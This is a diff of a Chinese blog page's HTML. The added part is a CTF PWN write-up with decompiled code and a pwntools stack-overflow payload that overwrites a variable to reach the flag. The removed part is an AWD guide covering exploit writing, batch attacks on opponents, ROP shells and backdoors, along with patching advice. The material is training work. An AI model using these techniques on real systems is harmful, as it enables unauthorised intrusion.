+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter a string: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">==</span> <span class="mh">0x1337BEEF</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">The string </span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s"> is lame.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="不足之处">不足之处
-</h2><p>我去&hellip;第一次接触PWN-AWD，是真坐牢，什么都不会，看到free我就知道这下午肯定坐牢了&hellip;</p>
-<p>附件： <a class="link" href="awd.7z" >awd.7z</a></p>
-<p>第一次连，scp都连不上，多亏群主相助。</p>
-<p><img src="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1.png"
-	width="1055"
-	height="149"
-	srcset="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1_hu_10d5ac0ad9e3493f.png 480w, /p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1_hu_f6405d7dde736fb6.png 1024w"
+</div><p>read_flag函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">read_flag</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-44h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span> <span class="c1">// [esp+Ah] [ebp-3Eh] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">stream</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;File Error: flag.txt does not exist.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Congratulations. Your string is not lame. Here you go: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>大致思路是v5等于0x1337BEEF就行了，但不能靠栈溢出，因为开了canary，这里应该用堆溢出了。</p>
+<p>做完才发现就是用栈溢出原理做的，太气人了&hellip;🤯</p>
+<p>gdb调试看栈变化：</p>
+<p><img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/4.png"
+	width="1854"
+	height="849"
+	srcset="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/4_hu_12ee7868bfebde5c.png 480w, /p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/4_hu_262adf6f45da3b64.png 1024w"
 	loading="lazy"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="708"
-		data-flex-basis="1699px"
+		data-flex-grow="218"
+		data-flex-basis="524px"
 	
 ></p>
-<p><img src="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2.png"
-	width="726"
-	height="469"
-	srcset="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2_hu_daf2b2690c7ed50f.png 480w, /p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2_hu_85c7f90fca397930.png 1024w"
-	loading="lazy"
-	
-		alt="程序运行"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="154"
-		data-flex-basis="371px"
-	
-></p>
-<h2 id="总结">总结
-</h2><p>AWD 中的 PWN 选手是 “攻防双核心”，既要能快速打穿对手拿分，又要能守住己方不丢分，其表现直接影响团队的最终排名。</p>
-<h3 id="攻击端任务打穿对手拿-flag-得分">攻击端任务：“打穿对手，拿 flag 得分”
-</h3><p>攻击是 AWD 的核心得分手段，PWN 选手需在比赛初期快速完成 “漏洞挖掘→EXP 编写→批量攻击→flag 提交” 的闭环，具体步骤如下：</p>
-<h4 id="1-漏洞挖掘快速定位可利用漏洞">1. 漏洞挖掘：快速定位可利用漏洞
-</h4><p>比赛会为每个队伍提供相同的 PWN 程序（源码或二进制文件），PWN 选手需第一时间分析程序漏洞，重点关注：</p>
-<p><strong>高危漏洞优先</strong>：优先挖掘可直接获取 Shell 的漏洞（如栈溢出、堆溢出、UAF、函数指针劫持等），其次是信息泄露漏洞（如格式化字符串、未初始化内存泄露，用于辅助获取 libc 基址、PIE 基址等）；</p>
-<p><strong>结合程序逻辑</strong>：针对 AWD 常见的 PWN 程序类型（如菜单式程序、文件操作程序、网络服务程序），重点检查 “输入处理”（如<code>gets</code>/<code>strcpy</code>无长度限制）、“内存管理”（如 free 后未置空指针、堆块重叠）、“功能调用”（如可控函数指针、系统命令调用）等环节；</p>
-<p><strong>工具辅助</strong>：用<code>IDA Pro</code>/<code>Ghidra</code>反编译二进制文件，<code>checksec</code>查看保护机制（PIE、RELRO、Stack Canary、NX），<code>gdb</code>动态调试验证漏洞触发条件。</p>
-<h4 id="2-exp-编写高效生成攻击脚本">2. EXP 编写：高效生成攻击脚本
-</h4><p>漏洞确认后，需编写自动化 Exploit（EXP）脚本，核心要求是<strong>稳定、通用</strong>：</p>
-<p>适配保护机制：</p>
-<p>1、若开启 PIE（地址随机化）：通过信息泄露漏洞（如 show 函数泄露）获取基址，动态计算目标地址；</p>
-<p>2、若开启 Stack Canary：判断是否可绕过（如通过 UAF 泄露 Canary 值），或优先选择无 Canary 保护的漏洞点；</p>
-<p>3、若开启 NX（栈不可执行）：构造 ROP 链调用<code>system(&quot;/bin/sh&quot;)</code>，或劫持<code>__free_hook</code>/<code>__malloc_hook</code>；</p>
-<p><strong>自动化交互</strong>：用<code>pwntools</code>库封装程序交互逻辑（如菜单选择、输入发送、结果接收），确保 EXP 能自动完成 “连接目标→触发漏洞→获取 Shell→读取 flag” 的全流程；</p>
-<p><strong>批量攻击适配</strong>：比赛中需攻击多个对手 IP（通常是 C 段或指定 IP 列表），EXP 需支持批量读取 IP 列表、多线程攻击，提升攻击效率。</p>
-<h4 id="3-漏洞利用获取-shell-与-flag">3. 漏洞利用：获取 Shell 与 flag
-</h4><p><strong>远程攻击</strong>：通过 EXP 连接对手服务器的 PWN 程序端口，触发漏洞获取 Shell（如<code>system(&quot;/bin/sh&quot;)</code>）；</p>
-<p><strong>flag 读取</strong>：AWD 比赛中，flag 通常存放在固定路径（如<code>/home/flag.txt</code>、<code>/tmp/flag</code>），获取 Shell 后执行<code>cat 路径</code>读取 flag，按比赛要求提交（如 POST 到指定接口、写入己方 flag 存储目录）；</p>
-<p><strong>横向扩展</strong>：若获取的 Shell 权限较高（如 root），可进一步横向渗透（如查看其他服务、种植后门），但需注意比赛规则（部分比赛禁止破坏对手服务器）。</p>
-<h4 id="4-对抗性优化应对对手防御">4. 对抗性优化：应对对手防御
-</h4><p>随着比赛推进，对手会修复漏洞，PWN 选手需调整攻击策略：</p>
-<p><strong>多漏洞备份</strong>：若主漏洞被修复，快速切换到备用漏洞（如主漏洞是栈溢出，备用漏洞是格式化字符串）；</p>
-<p><strong>绕过修复</strong>：分析对手的修复逻辑（如简单添加长度检查），寻找绕过方法（如利用修复漏洞的逻辑缺陷，或构造特殊输入绕过检查）；</p>
-<p><strong>0day 储备</strong>：若提前挖掘到未被普遍发现的漏洞（0day），可在后期对手放松防御时集中攻击，获取大量分数。</p>
-<h3 id="防御端任务修复漏洞守住己方服务器">防御端任务：“修复漏洞，守住己方服务器”
-</h3><p>防御的核心是 “不让对手利用己方 PWN 程序漏洞”，需在攻击的同时快速完成漏洞修复，避免丢分：</p>
-<h4 id="1-漏洞修复针对性修补漏洞点">1. 漏洞修复：针对性修补漏洞点
-</h4><p>根据攻击端挖掘的漏洞，对己方 PWN 程序进行最小化修复（避免过度修改导致程序无法运行），常见修复方式：</p>
-<p>栈溢出 / 堆溢出修复：</p>
-<p>替换危险函数（如<code>gets</code>→<code>fgets</code>、<code>strcpy</code>→<code>strncpy</code>），严格限制输入长度；</p>
-<p>对堆操作添加边界检查（如检查<code>index</code>是否在合法范围、堆块大小是否合理）；</p>
-<p>格式化字符串漏洞修复：</p>
-<p>将<code>printf(user_input)</code>改为<code>printf(&quot;%s&quot;, user_input)</code>，避免用户可控内容作为格式字符串；</p>
-<p>UAF 漏洞修复：</p>
-<p>free<code>内存后将指针置空（如</code>free(list[index]); list[index] = NULL<code>），后续使用前检查指针是否为</code>NULL`；</p>
-<p>函数指针劫持修复：</p>
-<p>维护合法函数指针列表，调用前检查指针是否在列表内（如<code>if (func_ptr != bay_dance &amp;&amp; func_ptr != chestnut_dance) return;</code>）。</p>
-<h4 id="2-程序重编译与部署">2. 程序重编译与部署
-</h4><p><strong>编译选项加固</strong>：重新编译修复后的程序时，开启更严格的保护机制（如<code>-fstack-protector-strong</code>增强 Canary、<code>-Wl,-z,relro,-z,now</code>开启全 RELRO），提升对手攻击难度；</p>
-<p><strong>快速部署</strong>：将修复后的程序替换己方服务器上的原程序，重启服务（注意避免服务中断时间过长，部分比赛会因服务不可用扣分）；</p>
-<p><strong>验证修复效果</strong>：用己方编写的 EXP 测试修复后的程序，确认漏洞已被封堵（如 EXP 无法触发 Shell、程序无崩溃）。</p>
-<h4 id="3-日志监控与攻击溯源">3. 日志监控与攻击溯源
-</h4><p><strong>日志分析</strong>：监控 PWN 程序的运行日志（如输入输出日志、系统调用日志），识别对手的攻击尝试（如异常输入、重复连接）；</p>
-<p><strong>流量捕获</strong>：用<code>tcpdump</code>/<code>wireshark</code>捕获 PWN 程序端口的网络流量，分析对手的 EXP 特征（如固定 payload 开头、交互流程），为后续防御优化提供依据；</p>
-<p><strong>应急响应</strong>：若发现己方服务器被攻击（如 flag 被窃取），立即检查 PWN 程序是否存在未修复的漏洞，或是否有新的漏洞被利用，快速二次修复。</p>
-<h3 id="关键能力要求">关键能力要求
-</h3><p><strong>漏洞挖掘速度</strong>：比赛初期（前 30 分钟）能否快速定位可利用漏洞，直接决定攻击的 “黄金窗口期”；</p>
-<p><strong>EXP 稳定性</strong>：编写的 EXP 需能应对不同服务器环境（如不同 libc 版本、系统内核），避免因环境差异导致攻击失败；</p>
-<p><strong>修复准确性</strong>：修复漏洞时需精准定位问题点，避免引入新 bug（如过度修改导致程序功能异常）；</p>
-<p><strong>抗压能力</strong>：比赛中需同时处理 “攻击” 和 “防御”，需快速切换思路，应对对手的动态攻击策略。</p>
+<p>可以看到canary地址居然在v5地址之下，也就是说我们刻意栈溢出到v5，再溢出超过v5才会触发栈溢出保护。</p>
+<p>那我们的payload就比较简单了，根据IDA分析的main函数可以知道：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="mh">0x1337BEEF</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">v5</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完整exp在上面。</p>
+<blockquote class="alert alert-tip">
+    <blockquote>
+<p>再出题人没有刻意动题的情况下，canary地址一直都是00整结尾的，稍加留意，也是一种技巧。实在不行你一个个变量溢出看看，可以发现你把v5覆盖后却能正常运行，超过v5却退出程序运行了，这点很明显是canary地址在v5地址之下。</p></blockquote></blockquote>
 
 </section>
 
@@ -1114,7 +1035,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-10-03
+            最后更新于 2025-10-08
         </span>
     </section></footer>
 
@@ -1156,6 +1077,30 @@ unicode: "ece7"
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd1.ea997f807707c69a201fedb82801556a_hu_c07e85acdb17771f.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 第一次AWD水友赛"
+                        
+                        data-hash="md5-6pl/gHcHxpogH&#43;24KAFVag==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第一次AWD水友赛</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -1207,6 +1152,30 @@ unicode: "ece7"
             
                 
 <article class="has-image">
+    <a href="/p/pwn-4/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwn-4/PWN4.3657bbeb84fdb7f3290e78d3c41b8d4c_hu_d9ba59500c5360b4.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN-4"
+                        
+                        data-hash="md5-Nle764T9t/MpDnjTxBuNTA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN-4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
     <a href="/p/pwn-3/">
         
         
@@ -1224,54 +1193,6 @@ unicode: "ece7"
 
         <div class="article-details">
             <h2 class="article-title">PWN-3</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/pwn-2/">
-        
-        
-            <div class="article-image">
-                <img src="/p/pwn-2/PWN2.ec0b8de7542727a390b799ae24c64af8_hu_ed10e985448522e2.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post PWN-2"
-                        
-                        data-hash="md5-7AuN51QnJ6OQt5muJMZK&#43;A==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">PWN-2</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/pwn-1/">
-        
-        
-            <div class="article-image">
-                <img src="/p/pwn-1/PWN.f98719505e350e475520e79f81d73a1d_hu_fb4f51a67c6d3b57.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post PWN-1"
-                        
-                        data-hash="md5-&#43;YcZUF41DkdVIOefgdc6HQ==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">PWN-1</h2>
         </div>
     </a>
 </article>
@@ -1383,11 +1304,17 @@ unicode: "ece7"
 
 
 
+
+
+
+
+
+
         
 <section class="wordcount">
   <div class="wordcount-row">
-    <p>博主发布了11篇文章  ||</p>
-    <p>总共176.25k 字</p>
+    <p>博主发布了14篇文章  ||</p>
+    <p>总共195.82k 字</p>
   </div>
 </section>
         
